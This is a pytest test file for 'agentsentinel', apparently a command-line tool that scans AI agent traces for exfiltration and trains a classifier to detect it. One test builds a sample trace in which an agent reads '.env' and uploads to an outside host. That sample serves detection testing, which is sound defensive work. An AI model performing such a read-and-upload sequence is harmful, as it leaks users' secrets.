import json
import subprocess
import sys
from pathlib import Path

import pytest


def run(*args: str | Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, "-m", "agentsentinel", *map(str, args)],
        text=True,
        capture_output=True,
        check=False,
    )


def test_scan_exit_codes_and_json(tmp_path: Path) -> None:
    path = tmp_path / "trace.json"
    path.write_text(
        json.dumps(
            {
                "steps": [
                    {"tool": "read_file", "args": {"path": ".env"}},
                    {"tool": "upload", "args": {"url": "https://outside.example"}},
                ]
            }
        )
    )
    result = run("scan", path, "--json")
    assert result.returncode == 1
    assert json.loads(result.stdout)["flagged"] is True
    path.write_text('{"steps": []}')
    assert run("scan", path).returncode == 0
    path.write_text("no json")
    assert run("scan", path).returncode == 2
    assert run("scan", tmp_path / "missing.json").returncode == 2
    assert run("scan", path, "--threshold", "nan").returncode == 2
    assert run("scan").returncode == 2


def test_train_and_eval(tmp_path: Path) -> None:
    corpus = Path("src/agentsentinel/data/default_corpus.jsonl")
    out = tmp_path / "model.json"
    result = run("train", corpus, "--out", out)
    assert result.returncode == 0, result.stderr
    assert "Training-set classifier metrics" in result.stdout
    assert out.is_file()
    result = run("eval", corpus, "--model", out)
    assert result.returncode == 0, result.stderr
    assert "Precision:" in result.stdout and "Recall[exfiltration]:" in result.stdout


def test_console_script_and_threshold_override(tmp_path: Path) -> None:
    path = tmp_path / "trace.json"
    path.write_text(Path("examples/exfiltration.json").read_text(encoding="utf-8"))
    executable = Path(sys.executable).parent / "agentsentinel"
    result = subprocess.run(
        [str(executable), "scan", str(path), "--threshold", "0.9", "--json"],
        text=True,
        capture_output=True,
        check=False,
    )
    assert result.returncode == 0
    report = json.loads(result.stdout)
    assert report["score"] == 0.85
    assert report["flagged"] is False
    assert report["categories"] == ["exfiltration"]


@pytest.mark.parametrize("threshold", ["-0.1", "1.1", "inf", "NaN", "bad"])
def test_invalid_threshold_is_usage_error(tmp_path: Path, threshold: str) -> None:
    path = tmp_path / "empty.json"
    path.write_text("{}", encoding="utf-8")
    result = run("scan", path, "--threshold", threshold)
    assert result.returncode == 2
    assert "threshold" in result.stderr
    assert "Traceback" not in result.stderr


@pytest.mark.parametrize("content", [b"[]", b"null", b"\xff"])
def test_bad_trace_files_are_input_errors(tmp_path: Path, content: bytes) -> None:
    path = tmp_path / "invalid.json"
    path.write_bytes(content)
    result = run("scan", path)
    assert result.returncode == 2
    assert "Traceback" not in result.stderr


@pytest.mark.parametrize("command", ["train", "eval"])
def test_bad_corpora_are_input_errors(tmp_path: Path, command: str) -> None:
    path = tmp_path / "invalid.jsonl"
    path.write_text('{"trace": {}, "label": "benign", "category": "exfiltration"}')
    result = run(command, path)
    assert result.returncode == 2
    assert "label/category mismatch" in result.stderr


def test_bad_model_is_input_error(tmp_path: Path) -> None:
    path = tmp_path / "model.json"
    path.write_text("{}", encoding="utf-8")
    assert (
        run("scan", Path("examples/exfiltration.json"), "--model", path).returncode == 2
    )
    assert (
        run(
            "eval", Path("src/agentsentinel/data/default_corpus.jsonl"), "--model", path
        ).returncode
        == 2
    )
